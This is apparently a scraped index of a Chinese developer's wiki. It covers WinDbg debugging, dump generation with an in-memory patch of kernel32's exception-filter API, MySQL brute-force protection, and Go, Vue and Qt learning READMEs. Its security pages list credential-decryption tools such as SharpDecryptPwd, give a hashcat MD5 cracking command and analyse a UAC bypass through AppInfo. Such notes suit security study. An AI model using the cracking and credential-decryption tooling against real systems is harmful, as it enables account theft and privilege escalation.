CloudFileFlags : 0xe0 +0x7ac CloudFileDiagFlags : 0 +0x7b0 PlaceholderCompatibilityMode : 2 &#x27;&#x27; +0x7b1 PlaceholderCompatibilityModeReserved : [7] &quot;&quot; +0x7b8 LeapSecondData : 0x00007df5`3fe20000 _LEAP_SECOND_DATA +0x7c0 LeapSecondFlags : 0 +0x7c0 SixtySecondEnabled : 0y0 +0x7c0 Reserved : 0y0000000000000000000000000000000 (0) +0x7c4 NtGlobalFlag2 : 0 查看 ProcessParameters为了进一步了解和查看，这里再查看 ProcessParameters 的变量。 查看 PEB 的输出可以看到 ProcessParameters 的结构体名为 _RTL_USER_PROCESS_PARAMETERS，该结构体保存了进程很多基础信息，如环境变量、命令行等等。查看当前 ProcessParameters 12345dx -r1 ((ntdll!_RTL_USER_PROCESS_PARAMETERS *)0x1a650d52540)# 或者dt _RTL_USER_PROCESS_PARAMETERS 0x1a650d52540 输出如下所示： 123456789101112131415161718192021222324252627282930313233343536373839400:007&gt; dt _RTL_USER_PROCESS_PARAMETERS 0x1a650d52540ntdll!_RTL_USER_PROCESS_PARAMETERS +0x000 MaximumLength : 0x78a +0x004 Length : 0x78a +0x008 Flags : 0x6001 +0x00c DebugFlags : 0 +0x010 ConsoleHandle : (null) +0x018 ConsoleFlags : 0 +0x020 StandardInput : (null) +0x028 StandardOutput : (null) +0x030 StandardError : (null) +0x038 CurrentDirectory : _CURDIR +0x050 DllPath : _UNICODE_STRING &quot;&quot; +0x060 ImagePathName : _UNICODE_STRING &quot;C:\\WINDOWS\\system32\\notepad.exe&quot; +0x070 CommandLine : _UNICODE_STRING &quot;&quot;C:\\WINDOWS\\system32\\notepad.exe&quot; &quot; +0x080 Environment : 0x000001a6`50d50fe0 Void +0x088 StartingX : 0 +0x08c StartingY : 0 +0x090 CountX : 0 +0x094 CountY : 0 +0x098 CountCharsX : 0 +0x09c CountCharsY : 0 +0x0a0 FillAttribute : 0 +0x0a4 WindowFlags : 0x801 +0x0a8 ShowWindowFlags : 1 +0x0b0 WindowTitle : _UNICODE_STRING &quot;C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Accessories\\Notepad.lnk&quot; +0x0c0 DesktopInfo : _UNICODE_STRING &quot;Winsta0\\Default&quot; +0x0d0 ShellInfo : _UNICODE_STRING &quot;&quot; +0x0e0 RuntimeData : _UNICODE_STRING &quot;&quot; +0x0f0 CurrentDirectores : [32] _RTL_DRIVE_LETTER_CURDIR +0x3f0 EnvironmentSize : 0x154e +0x3f8 EnvironmentVersion : 3 +0x400 PackageDependencyData : (null) +0x408 ProcessGroupId : 0x3ec +0x40c LoaderThreads : 0 +0x410 RedirectionDllName : _UNICODE_STRING &quot;&quot; +0x420 HeapPartitionName : _UNICODE_STRING &quot;&quot; +0x430 DefaultThreadpoolCpuSetMasks : (null) +0x438 DefaultThreadpoolCpuSetMaskCount : 0 +0x43c DefaultThreadpoolThreadMaximum : 0 到这一步，基本上进程的详细信息就都可以看到了。如果是 windbg preview 版本，点几下就能看到一些信息，但是 Environment 环境变量是一个指针，如果需要查看，还是需要输入命令才行。 查看 Environment在 _RTL_USER_PROCESS_PARAMETERS 结构中有三个成员与 Environment 相关 12345678# 指向环境变量的指针+0x080 Environment : 0x000001a6`50d50fe0 Void# 环境变量的大小+0x3f0 EnvironmentSize : 0x154e# 环境变量的版本+0x3f8 EnvironmentVersion : 3 通过环境变量指针和大小我们就可以看到环境变量的内容了 1db 0x000001a6`50d50fe0 l 0x154e"},{"title":"【调试技术】程序自动生成dump文件","date":"2024-04-16T03:41:57.086Z","path":"wiki/调试技术/【调试技术】程序自动生成dump文件.html","text":"[toc] 一、Windows 生成dump 本文主要说明windows操作系统下，程序如何自动生成dump文件 如果生成dump生成dump主要依赖于windowsapi函数 SetUnhandledExceptionFilter,参数为一个回调函数，主要依赖于该函数以及回调函数中的相关逻辑生成dump。 12LPTOP_LEVEL_EXCEPTION_FILTER WINAPI SetUnhandledExceptionFilter( _In_ LPTOP_LEVEL_EXCEPTION_FILTER lpTopLevelExceptionFilter） 注意点： 最好是在程序开始处设置回调 如果回调不生效，也可使用 AddVectoredExceptionHandler 函数设置回调，其用法与 SetUnhandledExceptionFilter 基本一致，但是需要注意的是，使用 AddVectoredExceptionHandler 后，outpuydebugstring 也会触发回调，所以这个函数慎用。 dump回调函数dump回调函数可根据自己的需求去编写，以下为一个示例： 1234567891011121314151617181920212223242526272829303132LONG WINAPI MyUnhandledExceptionFilter( struct _EXCEPTION_POINTERS *ExceptionInfo )&#123; SYSTEMTIME st; GetLocalTime(&amp;st); CString time_now = _T(&quot;&quot;); time_now.Format(_T(&quot;%04d_%02d_%02d_%02d_%02d_%03d.dmp&quot;), st.wYear, st.wMonth, st.wDay,st.wHour, st.wMinute, st.wSecond, st.wMilliseconds); CString dump_file_path = GetRootPath(); //获取程序所在的文件夹的路径 dump_file_path += _T(&quot;dump/&quot;); CreateDirectory(dump_file_path, NULL); dump_file_path += time_now; HANDLE hFile = CreateFile(dump_file_path, GENERIC_READ|GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); if( hFile == INVALID_HANDLE_VALUE ) return EXCEPTION_CONTINUE_EXECUTION; // 往下传，继续交给 windows 默认的处理函数处理 MINIDUMP_EXCEPTION_INFORMATION mdei; mdei.ThreadId = GetCurrentThreadId(); mdei.ExceptionPointers = ExceptionInfo; mdei.ClientPointers = NULL; MINIDUMP_CALLBACK_INFORMATION mci; mci.CallbackRoutine = NULL; mci.CallbackParam = 0; MiniDumpWriteDump(GetCurrentProcess(), GetCurrentProcessId(), hFile, MiniDumpNormal, &amp;mdei, NULL, &amp;mci); CloseHandle(hFile); return EXCEPTION_EXECUTE_HANDLER;&#125; 设置回调写完回调函数之后，调用 SetUnhandledExceptionFilter ，入参为回调函数。 1SetUnhandledExceptionFilter(MyUnhandledExceptionFilter); 到此，设置并捕获异常的接口完成，以下补充几点个人经验。 二、手写崩溃12345void CreteCrash()&#123; int *ptr = nullptr; *ptr = n;&#125; 三、回调不生效问题 SetUnhandledExceptionFilter 是无法捕获 printf, scan, strlen 等CRT函数的异常的，如printf(NULL) 异常;除此之外，在有的环境当中，因为软件被hook的问题，导致 函数不生效，设置的回调往往不起作用，此时可以修改设置 的函数地址来屏蔽其他软件的hook。 代码123456789101112131415161718192021void DisableSetUnhandledExceptionFilter()&#123; void* addr = (void*)GetProcAddress(LoadLibrary(_T(&quot;kernel32.dll&quot;)), &quot;SetUnhandledExceptionFilter&quot;); if (addr != NULL) &#123; unsigned char code[16]; int size = 0; code[size++] = 0x33; code[size++] = 0xC0; code[size++] = 0xC2; code[size++] = 0x04; code[size++] = 0x00; DWORD dwOldFlag, dwTempFlag; VirtualProtect(addr, size, PAGE_READWRITE, &amp;dwOldFlag); WriteProcessMemory(GetCurrentProcess(), addr, code, size, NULL); VirtualProtect(addr, size, dwOldFlag, &amp;dwTempFlag); &#125;&#125; 使用说明在程序启动并设置dump回调之后调用 DisableSetUnhandledExceptionFilter即可。 注意事项经本人测试，在部分机器上，使用 WriteProcessMemory和 VirtualProtect 可能会导致程序崩溃，并且不会生成dump。可尝试修改 VirtualProtect 和 WriteProcessMemory 函数的参数测试。 方案一修改 VirtualProtect 的 flag.设置为 PAGE_EXECUTE_READWRITE 1VirtualProtect(addr, size, PAGE_EXECUTE_READWRITE, &amp;dwOldFlag); 方案二WriteProcessMemory 可直接使用 memcpy 替代。 1memcpy(addr, code, size); 代码总结123456789101112131415DWORD dwOldFlag = 0;VirtualProtect(addr, size, PAGE_EXECUTE_READWRITE, &amp;dwOldFlag);#if 0HANDLE hProcess = GetCurrentProcess();if (!(hProcess == NULL || hProcess == INVALID_HANDLE_VALUE))&#123; WriteProcessMemory(GetCurrentProcess(), addr, code, size, NULL);&#125;else&#123; memcpy(addr, code, size);&#125;#endifmemcpy(addr, code, size);VirtualProtect(addr, size, dwOldFlag, &amp;dwOldFlag);"},{"title":"【windbg】脚本","date":"2024-04-16T03:41:21.594Z","path":"wiki/调试技术/【调试技术】脚本使用手册.html","text":"查看 LDR_DATA_TABLE_ENTRY 1!list -t ntdll!_LIST_ENTRY.Flink -x &quot;dt ntdll!_LDR_DATA_TABLE_ENTRY @$extret\\&quot; 00007ffa9f99c4c0"},{"title":"SharpDecrpty的使用","date":"2024-04-17T03:22:18.346Z","path":"wiki/弱密码/SharpDecrptyPwd使用.html","text":"[toc] 简介uknowsec&#x2F;SharpDecryptPwd: 对密码已保存在 Windwos 系统上的部分程序进行解析,包括：Navicat,TeamViewer,FileZilla,WinSCP,Xmangager系列产品（Xshell,Xftp)。源码：https://github.com/RowTeam/SharpDecryptPwd"},{"title":"hashcat使用","date":"2024-04-17T03:21:58.073Z","path":"wiki/弱密码/hashcat使用.html","text":"解密 md5目前只解密官方的好使，使用本地的md5文本解密失败 1hashcat -m 0 -w 4 -a 3 8743b52063cd84097a65d1633f5c74f5"},{"title":"弱密码检测","date":"2024-04-17T03:22:00.493Z","path":"wiki/弱密码/index.html","text":"项目介绍主要记录弱密码检测的一些工作，目前涉及的弱密码检测软件有 ElasticSearch、JBoss、OpenVPN 三个软件，如 mysql、RDP、SSH等知名服务的弱密码检测已有众多开源工具可供使用。 弱密码相关资料 概述： 弱密码检测是？ 开源整理开源工具hashcat [hashcat wiki]一款开源破解密码的工具 shack2&#x2F;SNETCracker 超级弱口令检查工具是一款Windows平台的弱口令审计工具，支持批量多线程检查，可快速发现弱密码、弱口令账号，密码支持和用户名结合进行检查，大大提高成功率，支持自定义服务端口和字典。 RowTeam&#x2F;SharpDecryptPwd: SharpDecryptPwd source, To Decrypt Navicat,Xmanager,Filezilla,Foxmail,WinSCP,etc破解了以下软件： 12345678910SharpDecryptPwd NavicatSharpDecryptPwd XmanagerSharpDecryptPwd TeamViewerSharpDecryptPwd FileZillaSharpDecryptPwd FoxmailSharpDecryptPwd TortoiseSVNSharpDecryptPwd WinSCPSharpDecryptPwd ChromeSharpDecryptPwd RDCManSharpDecryptPwd SunLogin 开源密码解密库：bcrypt password hashing (“password encryption”) for your software and your serversbCrypt 开源密码解密库 推荐阅读常用开源的弱口令检查审计工具_弱口令检测工具_Marsal的博客-CSDN博客"},{"title":"【弱密码】MySQL8-Connection_control-plugin","date":"2023-12-10T16:00:00.000Z","path":"wiki/MySQL8/【弱密码】MySQL8-Connection_control-plugin.html","text":"概述：MySQL 的连接控制插件的使用与相关配置设置(windows)。参考文档见文末。 安装插件1234INSTALL PLUGIN CONNECTION_CONTROL SONAME &#x27;connection_control.so&#x27;;INSTALL PLUGIN CONNECTION_CONTROL_FAILED_LOGIN_ATTEMPTS SONAME &#x27;connection_control.so&#x27;; 修改配置文件12[mysqld]plugin-load-add=connection_control.so 查看连接配置123456789show variables like &#x27;connection_control%&#x27;;+-------------------------------------------------+------------+| Variable_name | Value |+-------------------------------------------------+------------+| connection_control_failed_connections_threshold | 3 || connection_control_max_connection_delay | 2147483647 || connection_control_min_connection_delay | 1000 |+-------------------------------------------------+------------+ 修改启动配置文件如果已经安装注册了插件，为避免每次启动都需要设置参数，可以在配置文件中添加相关配置项。 1234[mysqld]plugin-load-add=connection_control.soconnection-control=FORCE_PLUS_PERMANENTconnection-control-failed-login-attempts=FORCE_PLUS_PERMANENT 设置连接尝试次数12345CREATE USER &#x27;u1&#x27;@&#x27;localhost&#x27; IDENTIFIED BY &#x27;password&#x27; FAILED_LOGIN_ATTEMPTS 3 PASSWORD_LOCK_TIME 3;ALTER USER &#x27;u2&#x27;@&#x27;localhost&#x27; FAILED_LOGIN_ATTEMPTS 4 PASSWORD_LOCK_TIME UNBOUNDED; 登录时候后就会有如下提示（重启mysql服务可解除锁定）,目前已知的是虽然 mysql 命令行登录 和 mysql::mysql_real_connect 使用的是不同接口，但是触发策略最终的接口是同一个，都会触发防爆破策略。 123C:\\mysql-8.1.0-winx64\\bin&gt;mysql -ucspweak2 -padmin123mysql: [Warning] Using a password on the command line interface can be insecure.ERROR 3955 (HY000): Access denied for user &#x27;cspweak2&#x27;@&#x27;localhost&#x27;. Account is blocked for 3 day(s) (3 day(s) remaining) due to 3 consecutive failed logins. 查看登录失败的用户1234567mysql&gt; select * from INFORMATION_SCHEMA.CONNECTION_CONTROL_FAILED_LOGIN_ATTEMPTS;+--------------------+-----------------+| USERHOST | FAILED_ATTEMPTS |+--------------------+-----------------+| &#x27;root&#x27;@&#x27;localhost&#x27; | 9 |+--------------------+-----------------+1 row in set (0.00 sec) 其他补充用户表字段12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455+--------------------------+-----------------------------------+------+-----+-----------------------+-------+| Field | Type | Null | Key | Default | Extra |+--------------------------+-----------------------------------+------+-----+-----------------------+-------+| Host | char(255) | NO | PRI | | || User | char(32) | NO | PRI | | || Select_priv | enum(&#x27;N&#x27;,&#x27;Y&#x27;) | NO | | N | || Insert_priv | enum(&#x27;N&#x27;,&#x27;Y&#x27;) | NO | | N | || Update_priv | enum(&#x27;N&#x27;,&#x27;Y&#x27;) | NO | | N | || Delete_priv | enum(&#x27;N&#x27;,&#x27;Y&#x27;) | NO | | N | || Create_priv | enum(&#x27;N&#x27;,&#x27;Y&#x27;) | NO | | N | || Drop_priv | enum(&#x27;N&#x27;,&#x27;Y&#x27;) | NO | | N | || Reload_priv | enum(&#x27;N&#x27;,&#x27;Y&#x27;) | NO | | N | || Shutdown_priv | enum(&#x27;N&#x27;,&#x27;Y&#x27;) | NO | | N | || Process_priv | enum(&#x27;N&#x27;,&#x27;Y&#x27;) | NO | | N | || File_priv | enum(&#x27;N&#x27;,&#x27;Y&#x27;) | NO | | N | || Grant_priv | enum(&#x27;N&#x27;,&#x27;Y&#x27;) | NO | | N | || References_priv | enum(&#x27;N&#x27;,&#x27;Y&#x27;) | NO | | N | || Index_priv | enum(&#x27;N&#x27;,&#x27;Y&#x27;) | NO | | N | || Alter_priv | enum(&#x27;N&#x27;,&#x27;Y&#x27;) | NO | | N | || Show_db_priv | enum(&#x27;N&#x27;,&#x27;Y&#x27;) | NO | | N | || Super_priv | enum(&#x27;N&#x27;,&#x27;Y&#x27;) | NO | | N | || Create_tmp_table_priv | enum(&#x27;N&#x27;,&#x27;Y&#x27;) | NO | | N | || Lock_tables_priv | enum(&#x27;N&#x27;,&#x27;Y&#x27;) | NO | | N | || Execute_priv | enum(&#x27;N&#x27;,&#x27;Y&#x27;) | NO | | N | || Repl_slave_priv | enum(&#x27;N&#x27;,&#x27;Y&#x27;) | NO | | N | || Repl_client_priv | enum(&#x27;N&#x27;,&#x27;Y&#x27;) | NO | | N | || Create_view_priv | enum(&#x27;N&#x27;,&#x27;Y&#x27;) | NO | | N | || Show_view_priv | enum(&#x27;N&#x27;,&#x27;Y&#x27;) | NO | | N | || Create_routine_priv | enum(&#x27;N&#x27;,&#x27;Y&#x27;) | NO | | N | || Alter_routine_priv | enum(&#x27;N&#x27;,&#x27;Y&#x27;) | NO | | N | || Create_user_priv | enum(&#x27;N&#x27;,&#x27;Y&#x27;) | NO | | N | || Event_priv | enum(&#x27;N&#x27;,&#x27;Y&#x27;) | NO | | N | || Trigger_priv | enum(&#x27;N&#x27;,&#x27;Y&#x27;) | NO | | N | || Create_tablespace_priv | enum(&#x27;N&#x27;,&#x27;Y&#x27;) | NO | | N | || ssl_type | enum(&#x27;&#x27;,&#x27;ANY&#x27;,&#x27;X509&#x27;,&#x27;SPECIFIED&#x27;) | NO | | | || ssl_cipher | blob | NO | | NULL | || x509_issuer | blob | NO | | NULL | || x509_subject | blob | NO | | NULL | || max_questions | int unsigned | NO | | 0 | || max_updates | int unsigned | NO | | 0 | || max_connections | int unsigned | NO | | 0 | || max_user_connections | int unsigned | NO | | 0 | || plugin | char(64) | NO | | caching_sha2_password | || authentication_string | text | YES | | NULL | || password_expired | enum(&#x27;N&#x27;,&#x27;Y&#x27;) | NO | | N | || password_last_changed | timestamp | YES | | NULL | || password_lifetime | smallint unsigned | YES | | NULL | || account_locked | enum(&#x27;N&#x27;,&#x27;Y&#x27;) | NO | | N | || Create_role_priv | enum(&#x27;N&#x27;,&#x27;Y&#x27;) | NO | | N | || Drop_role_priv | enum(&#x27;N&#x27;,&#x27;Y&#x27;) | NO | | N | || Password_reuse_history | smallint unsigned | YES | | NULL | || Password_reuse_time | smallint unsigned | YES | | NULL | || Password_require_current | enum(&#x27;N&#x27;,&#x27;Y&#x27;) | YES | | NULL | || User_attributes | json | YES | | NULL | |+--------------------------+-----------------------------------+------+-----+-----------------------+-------+"},{"title":"","date":"2023-10-16T05:25:59.401Z","path":"more/Demo/Go/README.html","text":"Welcome to Go Demo For Learn 👋 GoLang 学习demo [toc] 🏠 HomepageAuthor👤 mingming Github: @hodlyounger Hello World基础语法学习记录排序算法设计模式 项目推荐Github 好的 golang 项目推荐 senghoo&#x2F;golang-design-pattern: 设计模式 Golang实现－《研磨设计模式》读书笔记 unknwon&#x2F;the-way-to-go_ZH_CN: 《The Way to Go》中文译本，中文正式名《Go 入门指南》 Show your supportGive a ⭐️ if this project helped you! This README was generated with ❤️ by readme-md-generator"},{"title":"","date":"2023-10-16T05:25:59.401Z","path":"more/Demo/Go/index.html","text":"Welcome to Go Demo For Learn 👋 GoLang 学习demo [toc] 🏠 HomepageAuthor👤 mingming Github: @hodlyounger 项目介绍学习 golang 的记录 Hello World基础语法学习记录排序算法设计模式 Show your supportGive a ⭐️ if this project helped you! This README was generated with ❤️ by readme-md-generator"},{"title":"","date":"2023-10-16T05:25:59.424Z","path":"more/Demo/Python/README.html","text":"Welcome to Python Demo 👋 python 学习及脚本整理 🏠 HomepageAuthor👤 mingming Website: github.com&#x2F;holdyounger Github: @holdyounger Show your supportGive a ⭐️ if this project helped you! 项目介绍 扫描文件夹并展示 扫描和统计代码行数 文本文件编码检测与转换 python socket 客户端python socket 服务端 This README was generated with ❤️ by readme-md-generator"},{"title":"","date":"2023-10-16T05:26:00.673Z","path":"more/Demo/Vue/README.html","text":"Welcome to Vue Demo 👋 Vue 学习记录 🏠 HomepageAuthor👤 mingming Github: @holdyounger Show your supportGive a ⭐️ if this project helped you! 项目介绍 vue语法 local_AppB站教程学习记录，vue语法使用以及记事本等简单demo实现 vue 使用api demo NetApp请求api接口实现每日一言功能 This README was generated with ❤️ by readme-md-generator"},{"title":"说明","date":"2023-10-16T05:26:00.517Z","path":"more/Demo/Visual Studio/index.html","text":"[toc] WindowsVs工程 迭代文件路径 获取处理器数量 获取主机域名 获取驱动文件类型 遍历网卡 获取Tcp端口 获取文件状态 获取系统状态 打开注册表 注册表类型 WaitForSingleObject 获取进程快照 QtQt回车符 QTextCodec C++break用法 引用传值 创建服务 EnumPrint Json11 Demo C实现string 反转链表C++ 翻转链表C TCP客户端和服务端 set容器 Socket通信"},{"title":"","date":"2023-10-16T05:26:00.717Z","path":"more/Demo/Vue/index.html","text":"Welcome to Vue Demo 👋 Vue 学习记录 🏠 HomepageAuthor👤 mingming Github: @holdyounger Show your supportGive a ⭐️ if this project helped you! 项目介绍 vue语法 local_AppB站教程学习记录，vue语法使用以及记事本等简单demo实现 vue 使用api demo NetApp请求api接口实现每日一言功能 This README was generated with ❤️ by readme-md-generator"},{"title":"说明","date":"2023-10-16T05:26:00.179Z","path":"more/Demo/Visual Studio/README.html","text":"[toc] WindowsVs工程 迭代文件路径 获取处理器数量 获取主机域名 获取驱动文件类型 遍历网卡 获取Tcp端口 获取文件状态 获取系统状态 打开注册表 注册表类型 WaitForSingleObject 获取进程快照 QtQt回车符 QTextCodec C++break用法 引用传值 创建服务 EnumPrint Json11 Demo C实现string 反转链表C++ 翻转链表C TCP客户端和服务端 set容器 Socket通信"},{"title":"","date":"2023-10-16T05:25:59.980Z","path":"more/Demo/Qt/index.html","text":"Welcome to Qt Demo 👋 Qt Code For Learning 🏠 HomepageAuthor👤 mingming Github: @holdyounger Show your supportGive a ⭐️ if this project helped you! This README was generated with ❤️ by readme-md-generator"},{"title":"","date":"2023-10-16T05:25:59.978Z","path":"more/Demo/Qt/README.html","text":"Welcome to Qt Demo 👋 Qt Code For Learning 🏠 HomepageAuthor👤 mingming Github: @holdyounger Show your supportGive a ⭐️ if this project helped you! This README was generated with ❤️ by readme-md-generator"},{"title":"【提权】利用AppInfo RPC服务的UAC Bypass技术详解","date":"2024-04-17T03:47:33.968Z","path":"wiki/安全/提权/【提权】利用AppInfo RPC服务的UAC Bypass技术详解.html","text":"概述： 利用 AppInfo RPC 服务的 UAC ByPass 提权流程 0x01 前言在阅读本文之前确保大家已经基本了 UAC 的大致流程。 UAC 的请求都是交由 AppInfo 这个系统服务来处理的，AppInfo 的进程为 svchost。 在提权流程中，Appinfo 也仅仅是作为中间连接的一环，一方面处理应用程序请求来的UAC请求，另一方面拉起consent.exe 来处理用户操作，最后将用户操反馈给应用程序。这就是 UAC 的大致流程。本文着重Appinfo 的相关流程来说明一下如何利用 Appinfo 进程 UAC Bypass。 0x02 AppInfo 调用说明操作：可以调试 Appinfo 的进程，然后通过启动 UAC 进程观察一个程序的uac请求到了 AppInfo 之后的流程。结合IDA的 exports 可以在一些关键函数打上断点然后进行调试。当然因为网上已经有大量的分析和调用流程说明了，所以这一步骤可以省略直接在一些关键的函数上打断点调试查看堆栈和参数。 因为UAC的提权都需要创建UI进程来让用户进行操作，这个UI进行就是 consent.exe，所以直接观察 consent.exe 的创建和调用即可。 这里直接对 AiLaunchConsentUI 打断点然后查看堆栈。 consent.exe的创建AppInfo 服务收到rpc消息后，最终通过 CreateProcessAsUser 创建。 这篇文章讲的比较细致：UAC逆向 调用堆栈如下所示： 1234567891011121314151617181920212223[0x0] ntdll!NtCreateUserProcess 0xdf231fc698 0x7ff9da72b473 [0x1] KERNELBASE!CreateProcessInternalW+0xfe3 0xdf231fc6a0 0x7ff9da728a03 [0x2] KERNELBASE!CreateProcessAsUserW+0x63 0xdf231fdc70 0x7ff9daa4de30 [0x3] KERNEL32!CreateProcessAsUserWStub+0x60 0xdf231fdce0 0x7ff9d4a4526b [0x4] appinfo!AiLaunchProcess+0x8eb 0xdf231fdd50 0x7ff9d4a4789d [0x5] appinfo!AiLaunchConsentUI+0x51d 0xdf231fec40 0x7ff9d4a471e3 [0x6] appinfo!AiCheckLUA+0x343 0xdf231fee60 0x7ff9d4a62ff1 [0x7] appinfo!AipGetTokenForService+0x245 0xdf231ff040 0x7ff9d4a639b6 [0x8] appinfo!RAiGetTokenForCOM+0x206 0xdf231ff160 0x7ff9db4ab4b3 [0x9] RPCRT4!Invoke+0x73 0xdf231ff220 0x7ff9db50c5ea [0xa] RPCRT4!Ndr64AsyncServerWorker+0x39a 0xdf231ff2d0 0x7ff9db489188 [0xb] RPCRT4!DispatchToStubInCNoAvrf+0x18 0xdf231ff3e0 0x7ff9db46a3a6 [0xc] RPCRT4!RPC_INTERFACE::DispatchToStubWorker+0x1a6 0xdf231ff430 0x7ff9db469fd6 [0xd] RPCRT4!RPC_INTERFACE::DispatchToStubWithObject+0x186 0xdf231ff510 0x7ff9db47730f [0xe] RPCRT4!LRPC_SCALL::DispatchRequest+0x16f 0xdf231ff5b0 0x7ff9db4768c8 [0xf] RPCRT4!LRPC_SCALL::HandleRequest+0x7f8 0xdf231ff680 0x7ff9db475eb1 [0x10] RPCRT4!LRPC_ADDRESS::HandleRequest+0x341 0xdf231ff790 0x7ff9db47591e [0x11] RPCRT4!LRPC_ADDRESS::ProcessIO+0x89e 0xdf231ff830 0x7ff9db47a032 [0x12] RPCRT4!LrpcIoComplete+0xc2 0xdf231ff970 0x7ff9dc990330 [0x13] ntdll!TppAlpcpExecuteCallback+0x260 0xdf231ffa10 0x7ff9dc9c2f86 [0x14] ntdll!TppWorkerThread+0x456 0xdf231ffa90 0x7ff9daa47344 [0x15] KERNEL32!BaseThreadInitThunk+0x14 0xdf231ffd90 0x7ff9dc9c26b1 [0x16] ntdll!RtlUserThreadStart+0x21 0xdf231ffdc0 0x0 1consent.exe ppid 结构体长度 结构体地址 如上所示可以看到 consent.exe 的命令行传递了三个参数，分别为父进程id，结构体长度和结构体地址。那么基本上可以确定，uac的相关信息就在该结构体中，consent通过读写父进程的地址空间，将用户操作结果写入到对结构体对应的地址中。（这里有兴趣的同学还可以看一下consent.exe的调用流程。) 查看相关参数解析的部分如下所示： 可以看到命令行参数3的结构体对应的是 _CONSENTUI_PARAM_HEADER ，目前在网上找不到相关的结构，不过这里都不重要，大致了解这个过程和流程即可。 consentui.exe 的鉴权与回传这里主要观察一下 consent.ui 拿到参数之后是如何工作的，又是如何将获取的权限写回的。 在 WinMain 函数结束的地方调用了 NtWriteVirtualMemory 写入了 TargetHandle ，而这个 TargetHandle 就是在 CuiGetTokenForApp 中获取到的管理员 token 句柄。最后又把这个这个句柄写回到了 _CONSENTUI_PARAM_HEADER+7 的位置。 consentui 的弹窗逻辑通过分析找到了决定是否弹窗的关键函数为: 如果上述判断需要弹窗的话，最终跳转到 CuiStartBackgroundWindowAndSwitchToSecureDesktop 函数去执行操作。下面就 CuiCheckElevationAutoApprovalMedium 函数展开看一下判断的逻辑。如下所示，在函数内部首先是判断com组件是不是自提升的组件，调用的 CuiIsCOMClassAutoApprovable 并且传入了COM组件的GUID。 判断完成之后还需要几次跳转才能到弹窗的函数。以上就是 consent.exe 的弹窗逻辑了。 关键点大概就是以上三点，通过 RAiLuanchAdminProcess 创建 consent.exe，consent.exe 通过CuiIsCOMClassAutoApprovable 检查 com组件 权限，CuiStartBackgroundWindowAndSwitchToSecureDesktop 创建界面ui获取权限，NtWriteVirtualMemory 写内存方式写入获取到权限的句柄。"},{"title":"Go基础","date":"2023-10-16T05:25:59.404Z","path":"more/Demo/Go/shiyanlou_Handbook/ReadMe.html","text":"Go语言顺序编程流程控制Go 语言提供的流程控制语句包括 if、switch、for、goto、select，其中 select 用于监听 channel（通道）在讲解通道的时候再详细介绍。 if 语句语法： 1234567if optionalStatement1; booleanExpression1 &#123; block1&#125; else if optionalStatement2; booleanExpression2 &#123; block2&#125; else &#123; block3&#125; 其中 optionalStatement 是可选的表达式，真正决定分支走向的是 booleanExpression1 的值。 for 语句Go 语言的 for 语句可以遍历数组，切片，映射等类型，也可以用于无限循环。以下是其语法： 123456789101112131415for &#123; // 无限循环 block&#125;for booleanExpression &#123; // while循环，在Go语言中没有while关键字&#125;for index, char := range aString &#123; // 迭代字符串&#125;for item := range aChannel &#123; // 迭代通道&#125; 跳转语句Go 语言中使用 goto 关键字实现跳转。goto 语句的语义非常简单，就是跳转到本函数内的某个标签，例如： 123456789func myfunc()&#123; i := 0 THIS: //定义一个THIS标签 fmt.Println(i) i++ if i &lt; 1 &#123; goto THIS //跳转到THIS标签 &#125;&#125; switch语句Go 语言中 switch 分支既可用于常用的分支就像 C 语言中的 switch 一样，也可以用于类型开关，所谓类型开关就是用于判断变量属于什么类型。但是需要注意的是 Go 语言的 switch 语句不会自动贯穿，相反，如果想要贯穿需要添加 fallthrough 语句。表达式开关 switch 的语法如下： 123456switch optionalStatement; optionalExpression &#123; case expression1: block1 ... case expressionN: blockN default: blockD&#125; 下面是个例子： 12345678switch &#123; // 没有表达式，默认为True值，匹配分支中值为True的分支 case value &lt; minimum: return minimum case value &gt; maximum: return maximum default: return value&#125; 在上面的例子中，switch 后面没有默认的表达式，这个时候 Go 语言默认其值为 True。 在前面我们提到过类型断言，如果我们知道变量的类型就可以使用类型断言，但是当我们知道类型可能是许多类型中的一种时候，我们就可以使用类型开关。其语法如下： 123456switch optionalStatement; typeSwitchGuard &#123; case type1: block1 ... case typeN: blockN default: blockD&#125; 说了这么多，让我们进行下练习，创建源文件 switch_t.go，输入以下代码： 😎😎这个demo很重❗❗❗❗❗❗❗&gt;😎😎 1 以上代码中我们首先创建了一个接收任意数量任意类型参数的函数，然后使用 for ... range aSlice 的语法迭代了每一个在切片 items 中的元素，接着使用了 switch 类型开关判断了每一个参数的类型，并打印了其值和类型。程序运行输出如下： 1234567$ go run switch_t.goparam #0 is a int, value: 5param #1 is a float64, value: -17.980000param #2 is a string, value: AIDENparam #3 is a nilparam #4 is a bool, value: trueparam #5&#x27;s type is unknow 函数Go 语言可以很方便的自定义函数，其中有特殊的函数 main 函数。main 函数必须出现在 main 包里，且只能出现一次。当 Go 程序运行时候会自动调用 main 函数开始整个程序的执行。main 函数不可接收任何参数，也不返回任何结果。 函数的定义在 Go 语言中，函数的基本组成包括：关键字 func、函数名、参数列表、返回值、函数体和返回语句，这里我们用一个简单的加法函数来对函数的定义进行说明。 12345package addfunc Add(a int, b int) (num int)&#123; return a + b&#125; 函数的调用函数调用非常简单，先将被调用函数所在的包导入，就可以直接使用该函数了。注意需要把包文件夹放到 $GOPATH 目录中，实例如下： 1234567891011package mainimport ( &quot;add&quot; //导入 add 包 &quot;fmt&quot;)func main()&#123; c := add.Add(1, 2) //调用 add 包中的 add 函数 fmt.Println(c)&#125; 与 C&#x2F;C++ 和 JAVA 不同，Go 语言的函数和方法可以有多个返回值，这是 Go 提供的一个优美的特性，示例如下： 12345678910package Divideimport &quot;errors&quot;func divide (a int, b int) (num int, err error)&#123; //定义两个返回值 if b == 0 &#123; err = errors.New(&quot;被除数不能为零！&quot;) return &#125; return a / b, nil //支持多个返回值&#125; 匿名函数在 Go 语言中，你可以在代码里随时定义匿名函数，匿名函数由一个不带函数名的函数声明和函数体组成，示例如下： 123func (a, b, c int) bool &#123; return a * b &lt; c&#125; 你可以将匿名函数直接赋值给一个变量，也可以直接调用运行，示例如下： 1234567x := func (a, b, c int) bool &#123; return a * b &lt; c&#125;func (a, b, c int) bool &#123; return a * b &lt; c&#125; (1, 2, 3) //小括号内直接给参数列表表示函数调用 类型转换类型转换Go 